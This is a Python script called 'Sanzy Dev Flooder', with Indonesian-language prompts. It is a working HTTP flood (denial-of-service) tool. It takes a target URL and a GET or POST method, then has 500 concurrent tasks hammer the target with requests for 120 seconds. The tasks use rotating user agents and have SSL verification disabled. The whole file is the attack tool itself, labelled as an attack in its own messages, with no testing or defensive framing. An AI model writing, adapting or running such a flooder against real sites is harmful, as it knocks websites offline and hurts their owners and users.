import asyncio
import aiohttp
import random
import time
import datetime

CONNECTIONS = 500
DURATION = 120
USER_AGENT_FILE = 'user-agents.txt'

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

USER_AGENTS = []
try:
    with open(USER_AGENT_FILE, 'r') as f:
        USER_AGENTS = [line.strip() for line in f if line.strip()]
    if not USER_AGENTS:
        print(f"{Colors.WARNING}Peringatan: File {USER_AGENT_FILE} kosong atau tidak ada agen pengguna yang valid.{Colors.ENDC}")
        print(f"{Colors.WARNING}Menggunakan agen pengguna default.{Colors.ENDC}")
        USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"]
except FileNotFoundError:
    print(f"{Colors.FAIL}Error: File {USER_AGENT_FILE} tidak ditemukan.{Colors.ENDC}")
    print(f"{Colors.WARNING}Menggunakan agen pengguna default.{Colors.ENDC}")
    USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"]


async def flood(session, target_url, http_method):
    while True:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
        try:
            request_method = getattr(session, http_method.lower())
            async with request_method(target_url, headers=headers, timeout=10) as response:
                await response.read()
        except Exception:
            pass

def display_banner():
    print(f"{Colors.OKCYAN}{Colors.BOLD}=================================================={Colors.ENDC}")
    print(f"{Colors.OKGREEN}{Colors.BOLD}                 Sanzy Dev Flooder                {Colors.ENDC}")
    print(f"{Colors.OKCYAN}{Colors.BOLD}=================================================={Colors.ENDC}")
    now = datetime.datetime.now()
    print(f"{Colors.OKBLUE}Tanggal & Waktu: {now.strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}\n")

async def main():
    display_banner()

    print(f"{Colors.HEADER}Pilih Metode Serangan:{Colors.ENDC}")
    print(f"1. {Colors.OKGREEN}GET{Colors.ENDC}")
    print(f"2. {Colors.OKGREEN}POST{Colors.ENDC}")

    method_choice = ""
    while method_choice not in ['1', '2']:
        method_choice = input(f"{Colors.WARNING}Pilihan Anda (1-2): {Colors.ENDC}").strip()
        if method_choice not in ['1', '2']:
            print(f"{Colors.FAIL}Pilihan tidak valid. Silakan pilih 1 atau 2.{Colors.ENDC}")

    http_method = "GET" if method_choice == '1' else "POST"

    target_url = ""
    while not target_url:
        target_url = input(f"{Colors.WARNING}Masukkan Target URL (contoh: https://example.com): {Colors.ENDC}").strip()
        if not (target_url.startswith('http://') or target_url.startswith('https://')):
            print(f"{Colors.FAIL}URL tidak valid. Harap sertakan http:// atau https://{Colors.ENDC}")
            target_url = ""

    print(f"\n{Colors.OKCYAN}Mempersiapkan serangan ke {Colors.BOLD}{target_url}{Colors.ENDC}{Colors.OKCYAN} dengan metode {Colors.BOLD}{http_method}{Colors.ENDC}...")
    print(f"Jumlah koneksi: {Colors.BOLD}{CONNECTIONS}{Colors.ENDC}")
    print(f"Durasi serangan: {Colors.BOLD}{DURATION}{Colors.ENDC} detik")
    print(f"{Colors.WARNING}Tekan Ctrl+C untuk menghentikan serangan lebih awal.{Colors.ENDC}\n")

    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=None)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        print(f"{Colors.OKGREEN}Serangan dimulai...{Colors.ENDC}")
        tasks = [asyncio.create_task(flood(session, target_url, http_method)) for _ in range(CONNECTIONS)]
        try:
            await asyncio.sleep(DURATION)
        except asyncio.CancelledError:
            print(f"\n{Colors.WARNING}Serangan dihentikan oleh pengguna.{Colors.ENDC}")
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}Serangan dihentikan oleh pengguna (Ctrl+C).{Colors.ENDC}")
        finally:
            print(f"\n{Colors.OKBLUE}Menghentikan semua tugas...{Colors.ENDC}")
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"{Colors.OKGREEN}Semua tugas telah dihentikan. Serangan selesai.{Colors.ENDC}")

if __name__ == "__main__":
    asyncio.run(main())